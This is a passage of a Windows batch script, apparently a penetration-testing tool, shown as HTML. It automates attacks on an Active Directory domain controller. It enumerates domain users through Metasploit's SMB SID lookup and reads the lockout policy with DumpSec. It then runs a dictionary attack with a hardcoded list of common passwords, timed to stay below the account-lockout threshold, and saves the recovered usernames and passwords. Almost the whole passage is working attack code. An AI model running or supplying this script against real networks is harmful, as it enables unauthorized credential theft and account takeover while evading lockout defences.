Ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_lookupsid THREADS=15 MaxRID=10000 SMBDomain=. RHOSTS=file:%mypwd%\\dc_target.txt E 2&gt; nul 1&gt;&gt; usrtmp.txt<br/>
<br/>
REM ## CHECK IF SUCCESSFUL<br/>
grep -i "user=" usrtmp.txt | wc -l | sed -e "s/^[ \]*//" &gt; dc_success<br/>
SET /P dc_success=&lt;dc_success<br/>
IF %dc_success% GEQ 1 GOTO :runsidcomplete<br/>
<br/>
REM ## GET LINE COUNT of dclist.txt<br/>
wc -l dclist.txt &nbsp;| sed s/dclist.txt //g | sed -e "s/^[ \]*//" &gt; dc_pending_count<br/>
SET /P dc_pending_count=&lt;dc_pending_count<br/>
<br/>
REM IF dclist.txt IS NOT EMPTY TRY NEXT DC<br/>
IF %dc_pending_count% GEQ 1 GOTO :runsid<br/>
<br/>
:runsidcomplete<br/>
REM ## CLEAN &nbsp;UP TEMP FILES<br/>
IF EXIST dclist.txt DEL dclist.txt<br/>
IF EXIST dc_target.txt DEL dc_target.txt<br/>
IF EXIST dcs_scanned.txt DEL dcs_scanned.txt<br/>
IF EXIST dc_success DEL dc_success<br/>
<br/>
REM ## PARSE CLEAN LIST OF USERS<br/>
grep -i "user=" usrtmp.txt | gawk -F " " "{print $3}" | gawk -F "USER=" "{print $2}" | grep -v "\$" |gawk "!/\$/" | sort | uniq 2&gt;nul 1&gt; allusers.txt<br/>
IF EXIST usrtmp.txt del usrtmp.txt<br/>
<br/>
REM ## GET NUMBER OF ENUMERATED USERS<br/>
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST user_count del user_count<br/>
IF EXIST allusers.txt move allusers.txt domain_users_rpc_sidbf.txt 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## CHECK FOR FAILURE<br/>
if %user_count% LEQ 1 ECHO &nbsp;[-] &nbsp;RESULT: FAILED &amp;&amp; GOTO :USERCHECK<br/>
<br/>
REM ## PRINT NUMBER OF ENUMERATED USERS<br/>
ECHO &nbsp;[*] &nbsp;RESULT: Enumerated %user_count%users (domain_users_rpc_sidbf.txt) <br/>
<br/>
REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)<br/>
IF %quickmode% equ Y GOTO :USERCHECK<br/>
<br/>
REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE<br/>
GOTO :USERCHECK<br/>
<br/>
<br/>
:USERCHECK<br/>
REM -------------------------------------------------------<br/>
REM VERIFY USERS WHERE ENUMERATED BEFORE ATTACKING<br/>
REM -------------------------------------------------------<br/>
<br/>
REM ## DUMP ALL USERS FROM ALL PROTOCOLS INTO allusers.txt<br/>
cat domain_users*.txt |sort|uniq &gt; allusers.txt<br/>
<br/>
REM ## GET NUMBER OF USERS ENUMERATED<br/>
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST user_count del user_count<br/>
<br/>
REM ## NOTIFY USER IF NO USERS WHERE ENUMERATED<br/>
IF %user_count% EQU 0 ECHO &nbsp;[*] &nbsp; &nbsp; INFO: No users enumerated &amp;&amp; DEL allusers.txt &amp;&amp; GOTO :END<br/>
<br/>
REM ## CHECK IF USER WANTS AUTO DICTIONARY ATTACK<br/>
IF %attack% equ N GOTO :END<br/>
<br/>
REM ## ATTACK IF USERS WHERE ENUMERATED &amp; Dictionary attack is requested<br/>
GOTO :GETPOLICY<br/>
<br/>
<br/>
:GETPOLICY&#09;<br/>
REM ## CHECK IF AUTOMATED DICTIONARY ATTACK IS ENABLED<br/>
IF %attack% equ N GOTO :END<br/>
<br/>
REM -------------------------------------------------------<br/>
REM &nbsp;ENUMERATE PASSWORD POLICY FROM DOMAIN CONTROLLER<br/>
REM -------------------------------------------------------<br/>
REM ECHO &nbsp;[*] &nbsp;ACTION: Attempting policy enumeration with DUMPSEC...<br/>
<br/>
REM ## GET LOCKOUT POLICY<br/>
%dumpsecpath% /computer=\\%mydc% /rpt=policy /saveas=csv /outfile=pwpolicy.txt 2&gt; nul<br/>
grep -i "Lockout after " pwpolicy.txt | sed s/"Lockout after"//g | sed s/"bad logon attempts"//g | grep -v "^$" | sed -e "s/^[ \]*//"&gt;lockout<br/>
<br/>
REM ## GET COUNT RESET<br/>
grep -i "Reset bad logon count after 15 minutes" pwpolicy.txt | gawk -F " " "{print $6}" | grep -v "^$" | sed -e "s/^[ \]*//" &gt;countreset<br/>
<br/>
REM ## SETUP VARIABLES<br/>
set /P countreset=&lt;countreset<br/>
set /P lockoutafter=&lt;lockout<br/>
set /A attempts=%lockoutafter%-2<br/>
<br/>
REM ## CLEAN UP TEMP FILES<br/>
IF EXIST pwpolicy.txt DEL pwpolicy.txt <br/>
IF EXIST lockout DEL lockout<br/>
IF EXIST countreset DEL countreset<br/>
<br/>
REM ## IF NO PASSWORD POLICY EXISTS ABORT DICTIONARY ATTACK - needs to be tested<br/>
IF %lockoutafter% EQU 0 ECHO &nbsp;[*] &nbsp; RESULT: No password policy exist, please confirm and attack manually!<br/>
IF %lockoutafter% EQU 0 ECHO &nbsp;[*] &nbsp; RESULT: Automated dictionary attack aborted! &amp;&amp; GOTO :END<br/>
<br/>
REM ## IF SUCESSFULL ELSE GOTO END<br/>
IF %attempts% GEQ 1 GOTO :DATTACK<br/>
ECHO &nbsp;[*] &nbsp; RESULT: Password policy could not be determined!<br/>
ECHO &nbsp;[*] &nbsp; RESULT: Automated dictionary attack aborted!<br/>
GOTO :END<br/>
<br/>
<br/>
:DATTACK<br/>
REM -------------------------------------------------------<br/>
REM ATTEMPT DICTIONARY ATTACK AGAINST DC<br/>
REM -------------------------------------------------------<br/>
ECHO &nbsp;------------------------------------------------------------------------------------<br/>
ECHO &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Starting Dictionary Attack <br/>
ECHO &nbsp;------------------------------------------------------------------------------------<br/>
REM ## GET DATE<br/>
FOR /F "tokens=*" %%i in ('date /t') do SET mydate=%%i<br/>
<br/>
REM ## GET TIME<br/>
FOR /F "tokens=*" %%i in ('time /t') do SET mytime=%%i<br/>
<br/>
REM ## PRINT START TIME<br/>
ECHO &nbsp;[*] &nbsp; &nbsp;INFO: START TIME is %mydate% %mytime%<br/>
<br/>
REM ## COMBINE USER LISTS<br/>
cat domain_users*.txt | sort | uniq 2&gt;nul 1&gt;allusers.txt<br/>
<br/>
REM ## GET NUMBER OF ENUMERATED USERS<br/>
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST user_count del user_count<br/>
<br/>
REM ## GENERATE DICTIONARY FILE FOR ATTACK<br/>
REM ## NOTE: Some of the psswords below should be changed manually<br/>
REM ## &nbsp; &nbsp; &nbsp; but mainly its rocku. &nbsp;Also, blank and username as pass<br/>
REM ## &nbsp; &nbsp; &nbsp; will be done via the smb_login module.<br/>
IF EXIST list_pending.txt DEL list_pending.txt<br/>
touch list_pending.txt<br/>
ECHO Spring2012&gt;&gt; list_pending.txt<br/>
ECHO Winter2012&gt;&gt; list_pending.txt<br/>
ECHO Sportsteam12&gt;&gt; list_pending.txt<br/>
ECHO companyname&gt;&gt; list_pending.txt<br/>
ECHO Companyname&gt;&gt; list_pending.txt<br/>
ECHO Summer2012&gt;&gt; list_pending.txt<br/>
ECHO Companyname1&gt;&gt; list_pending.txt<br/>
ECHO companyname1&gt;&gt; list_pending.txt<br/>
EcHO Companyname12&gt;&gt; list_pending.txt<br/>
EcHO companyname12&gt;&gt; list_pending.txt<br/>
ECHO Password&gt;&gt; list_pending.txt<br/>
ECHO password&gt;&gt; list_pending.txt<br/>
ECHO Password1&gt;&gt; list_pending.txt<br/>
ECHO password1&gt;&gt; list_pending.txt<br/>
ECHO P@ssw0rd1&gt;&gt; list_pending.txt<br/>
ECHO Password12&gt;&gt; list_pending.txt<br/>
ECHO password123&gt;&gt; list_pending.txt<br/>
ECHO Password123&gt;&gt; list_pending.txt<br/>
ECHO 12345&gt;&gt; list_pending.txt<br/>
ECHO 123456&gt;&gt; list_pending.txt<br/>
ECHO 654321&gt;&gt; list_pending.txt<br/>
ECHO 1234567&gt;&gt; list_pending.txt<br/>
ECHO 12345678&gt;&gt; list_pending.txt<br/>
ECHO 123456789&gt;&gt; list_pending.txt<br/>
ECHO 1234asdf&gt;&gt; list_pending.txt<br/>
ECHO qwerty&gt;&gt; list_pending.txt<br/>
ECHO Qwerty&gt;&gt; list_pending.txt<br/>
ECHO abc123&gt;&gt; list_pending.txt<br/>
ECHO letmein&gt;&gt; list_pending.txt<br/>
ECHO opensesme&gt;&gt; list_pending.txt<br/>
ECHO monkey&gt;&gt; list_pending.txt<br/>
ECHO Monkey&gt;&gt; list_pending.txt<br/>
ECHO myspace1&gt;&gt; list_pending.txt<br/>
ECHO link182&gt;&gt; list_pending.txt<br/>
ECHO liverpool&gt;&gt; list_pending.txt<br/>
ECHO iloveyou&gt;&gt; list_pending.txt<br/>
ECHO rockyou&gt;&gt; list_pending.txt<br/>
ECHO princess&gt;&gt; list_pending.txt<br/>
ECHO thomas&gt;&gt; list_pending.txt<br/>
ECHO Nicole&gt;&gt; list_pending.txt<br/>
ECHO Daniel&gt;&gt; list_pending.txt<br/>
ECHO babygirl&gt;&gt; list_pending.txt<br/>
ECHO michael&gt;&gt; list_pending.txt<br/>
ECHO Ashley&gt;&gt; list_pending.txt<br/>
ECHO yuiop&gt;&gt; list_pending.txt<br/>
&nbsp;<br/>
REM ## Get number of passwords to be used<br/>
wc -l &nbsp;list_pending.txt | sed -e "s/^[ \]*//" | sed s/list_pending.txt//g&gt; pwcount<br/>
SET /P pwcount=&lt;pwcount<br/>
IF EXIST pwcount del pwcount<br/>
<br/>
REM ## add 2 to pwcount; 1 blank;1 username as pw (built into smb_login)<br/>
SET /A pwcount=%pwcount%+2 <br/>
<br/>
REM ## GET PRESENT WORKING DIRECTORY<br/>
pwd &gt; pwd.txt<br/>
SET /P mydir=&lt;pwd.txt<br/>
IF EXIST pwd.txt DEL pwd.txt<br/>
<br/>
REM ## MODIFY PATH FOR METASPLOIT<br/>
echo %mydir%| sed s/\\/\\\\/g &gt; pwd.txt<br/>
SET /P mydir=&lt;pwd.txt<br/>
<br/>
IF EXIST pwd.txt DEL pwd.txt<br/>
<br/>
REM ## GET TARGET DC<br/>
head -n 1 dcs.txt &gt; targetdc.txt<br/>
set /p targetdc=&lt;targetdc.txt<br/>
IF EXIST targetdc.txt del targetdc.txt<br/>
<br/>
REM ## PRINT DICTIONARY CONFIGURATION INFO<br/>
ECHO &nbsp;[*] &nbsp; &nbsp;INFO: %targetdc% loaded as target<br/>
ECHO &nbsp;[*] &nbsp; &nbsp;INFO: %pwcount% passwords loaded <br/>
ECHO &nbsp;[*] &nbsp; &nbsp;INFO: %user_count%users loaded<br/>
ECHO &nbsp;[*] &nbsp; &nbsp;INFO: %lockoutafter%attempts can be made before accounts lockout<br/>
ECHO &nbsp;[*] &nbsp; &nbsp;INFO: %countreset% is the lockout counter reset time<br/>
ECHO &nbsp;[*] &nbsp; &nbsp;INFO: %attempts% passwords will be tested every %countreset% minutes<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Starting dictionary attack (takes a while)...<br/>
<br/>
REM ## EXECUTE DICTIONARY ATTACK WITH BLANK PASSWORD AND USERNAME AS PASSWORD<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Testing for blank passwords and username as password...<br/>
ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_login THREADS=15 BLANK_PASSWORDS=TRUE USER_AS_PASS=TRUE USER_FILE=%mydir%\\allusers.txt SMBDomain=. RHOSTS=%targetdc% E 2&gt; nul 1&gt;&gt; creds.txt<br/>
<br/>
REM ## SHOW AQUIRED PASSWORDS FOR ROUND<br/>
ECHO &nbsp;[*] &nbsp;RESULT: Recovered passwords:<br/>
grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15}" &gt;&gt;tmp_list.txt<br/>
FOR /F "tokens=*" %%i in ('type tmp_list.txt') do ECHO &nbsp;[*] &nbsp; &nbsp; &nbsp; &nbsp; %%i <br/>
IF EXIST tmp_list.txt DEL tmp_list.txt<br/>
<br/>
:RUN<br/>
REM ## SLEEP FOR NUMBER OF MINUTES DEFINED BY PASSWORD POLICY<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Waiting for counter to reset (%countreset% minutes)...<br/>
sleep %countreset%m<br/>
<br/>
REM ## SETUP PASSWORD FILES FOR SCAN<br/>
head -n %attempts% list_pending.txt &gt; list_targets.txt<br/>
head -n %attempts% list_pending.txt &gt;&gt; list_scanned.txt<br/>
diff -iw -d list_pending.txt list_scanned.txt | grep -i "&lt;" | grep -v "^$" | sed -e "s/^[ \]*//" | grep -v "\," | gawk -F " " "{print $2}" &gt; list_pending.txt<br/>
<br/>
REM ## DISPLAY PASSWORDS TO BE TESTED<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Testing the %attempts% passwords below:<br/>
FOR /F "tokens=*" %%i in ('cat list_targets.txt') do ECHO &nbsp;[*] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; %%i<br/>
<br/>
REM ## EXECUTE DICTIONARY ATTACK<br/>
ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_login THREADS=15 BLANK_PASSWORDS=FALSE USER_AS_PASS=FALSE PASS_FILE=%mydir%\\list_targets.txt USER_FILE=%mydir%\\allusers.txt SMBDomain=. RHOSTS=%targetdc% E 2&gt; nul 1&gt;&gt; creds.txt<br/>
<br/>
REM ## SHOW AQUIRED PASSWORDS FOR ROUND<br/>
ECHO &nbsp;[*] &nbsp;RESULT: Recovered passwords:<br/>
grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15}" &gt;&gt;tmp_list.txt<br/>
FOR /F "tokens=*" %%i in ('type tmp_list.txt') do ECHO &nbsp;[*] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%%i <br/>
IF EXIST tmp_list.txt DEL tmp_list.txt<br/>
<br/>
REM ## GET LINE COUNT OF LIST_PENDING.TXT<br/>
wc -l list_pending.txt | sed s/list_pending.txt//g | sed -e "s/^[ \]*//" &gt; line_count<br/>
SET /P line_count=&lt;line_count<br/>
<br/>
REM IF LIST_PENDING.TXT IS NOT EMPTY TRY NEXT GROUP OF PASSWORDS<br/>
IF %line_count% GEQ 1 GOTO :RUN<br/>
IF %line_count% EQU 0 ECHO &nbsp;[*] &nbsp;ACTION: Dictionary attack completed.<br/>
<br/>
REM ## CLEAN UP TEMP FILES<br/>
IF EXIST list_pending.txt DEL list_pending.txt<br/>
IF EXIST list_targets.txt DEL list_targets.txt<br/>
IF EXIST list_scanned.txt DEL list_scanned.txt<br/>
IF EXIST line_count DEL line_count<br/>
<br/>
REM # PARSE RECOVERED USERSNAME AND PASSWORDS<br/>
grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15 }" &gt; domain_passwords.txt<br/>
IF EXIST creds.txt del creds.txt<br/>
<br/>
REM ## GET NUMBER CREDENTIALS<br/>
wc -l domain_passwords.txt | sed -e "s/^[ \]*//" | sed s/domain_passwords.txt//g&gt;cred_count<br/>
SET /P cred_count=&lt;cred_count<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST cred_count del cred_count<br/>
<br/>
REM ## CHECK FOR FAILURE<br/>
IF %cred_count% EQU 0 ECHO &nbsp;[*] &nbsp;RESULT: No weak passwords were found &amp;&amp; goto :END<br/>
<br/>
REM ## PRINT NUMBER OF CREDETIALS RECOVERED<br/>
ECHO &nbsp;[*] &nbsp;RESULT: %cred_count%passwords were recovered<br/>
<br/>
REM ## PRINT CREDENTIALS<br/>
FOR /F "tokens=*" %%i in ('type domain_passwords.txt') do ECHO &nbsp;[*] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; %%i<br/>
<br/>
REM ## GET DATE<br/>
FOR /F "tokens=*" %%i in ('date /t') do SET mydate=%%i<br/>
<br/>
REM ## GET TIME<br/>
FOR /F "tokens=*" %%i in ('time /t') do SET mytime=%%i<br/>
<br/>
REM ## PRINT THE END TIME<br/>
ECHO &nbsp;[*] &nbsp; &nbsp;INFO: END TIME is %mydate% %mytime%<br/>
<br/>
:END<br/>
ECHO &nbsp;------------------------------------------------------------------------------------<br/>
ECHO.<br/>
REM ## CLEAN UP FILES<br/>
IF EXIST list_pending.txt del list_pending.txt<br/>
IF EXIST dcs.txt del dcs.txt<br/>
move allusers.txt domain_users_all.txt 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## REMOVE PROTOCOL USER ENUMERATION FILES<br/>
IF EXIST dcs.txt FOR /F "tokens=*" %%i in ('dir /b domain_user*') do IF EXIST %%i DEL %%i<br/>
<br/>
REM ## CLEAN UP SMB CONNECTIONS<br/>
IF EXIST dcs.txt FOR /F "tokens=*" %%i in ('type dcs.txt') do net use \\%%i\IPC$ /del 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## CLEAN UP VARIABLES<br/>
set attack=<br/>
set attempts=<br/>
set countreset=<br/>
set cred_count=<br/>
set creds=<br/>
set custom_domain=<br/>
set dc_count=<br/>
set domain_parameter=<br/>
set dumpsecpath=<br/>
set enumauth=<br/>
set enumpath=<br/>
set lockoutafter=<br/>
set metasploitpath=<br/>
set mydir=<br/>
set mypwd=<br/>
set netuse_auth=<br/>
set pw_count=<br/>
set pwcount=<br/>
set success=<br/>
set target_domain=<br/>
set targetdc=<br/>
set temp_var=<br/>
set totalvar=<br/>
set unixtoolspath=<br/>
set user_count=<br/>
set var1=<br/>
set var2=<br/>
</body></html>